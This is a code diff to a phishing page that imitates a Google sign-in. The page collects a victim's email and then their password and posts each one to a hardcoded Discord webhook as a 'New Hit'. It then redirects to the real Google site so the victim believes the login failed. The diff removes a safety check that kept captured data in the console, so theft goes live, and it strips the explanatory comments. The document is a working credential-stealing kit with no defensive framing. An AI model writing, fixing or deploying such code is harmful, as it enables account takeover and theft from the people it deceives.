@@ -169,7 +169,6 @@
         <div class="right-pane">
             <form id="capture-form" onsubmit="handleSubmit(event)">
                 <div class="input-group">
-                    <!-- The input changes type depending on the stage -->
                     <input type="text" id="credential-input" required>
                     <label id="input-label" for="credential-input">Email or phone</label>
                 </div>
@@ -193,31 +192,27 @@
     </div>
 
     <script>
-        // --- CONFIGURATION ---
-        // Paste your Discord webhook URL here
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1571987991503831181/yN4rsZkiOxrfs1GcpiALN6jbvZ_7-hqN8SkAGM2egyGqSLFS21rhVlbSe7adokLPEl4P";
-        
-        // Where to send them after the password is captured
         const REDIRECT_URL = "https://accounts.google.com/";
 
         let stage = "email"; 
         let capturedEmail = "";
 
         async function sendToWebhook(data) {
-            if (WEBHOOK_URL === "https://discord.com/api/webhooks/1571987991503831181/yN4rsZkiOxrfs1GcpiALN6jbvZ_7-hqN8SkAGM2egyGqSLFS21rhVlbSe7adokLPEl4P") {
-                console.warn("Webhook URL not set. Data logged to console instead:", data);
-                return;
-            }
             try {
-                await fetch(WEBHOOK_URL, {
+                const response = await fetch(WEBHOOK_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         content: `**New Hit**\n**Type:** ${data.type}\n**Value:** ${data.value}`
                     })
                 });
+                
+                if (!response.ok) {
+                    console.error("Discord rejected the webhook. Status:", response.status);
+                }
             } catch (e) {
-                console.error("Failed to send payload", e);
+                console.error("Network error sending to webhook:", e);
             }
         }
 
@@ -229,10 +224,8 @@
 
             if (stage === "email") {
                 capturedEmail = value;
-                // Send email payload
                 await sendToWebhook({ type: "Email", value: capturedEmail });
                 
-                // Transition to password stage
                 stage = "password";
                 document.getElementById('page-title').innerText = "Welcome";
                 document.getElementById('page-subtitle').innerText = capturedEmail;
@@ -240,13 +233,10 @@
                 input.type = "password";
                 input.value = "";
                 input.focus();
-                document.getElementById('forgot-btn').style.display = "none"; // Hide forgot button on password screen
+                document.getElementById('forgot-btn').style.display = "none";
             } 
             else if (stage === "password") {
-                // Send password payload
                 await sendToWebhook({ type: "Password", value: value });
-                
-                // Redirect to real Google so they think it failed and try again
                 window.location.href = REDIRECT_URL;
             }
         }
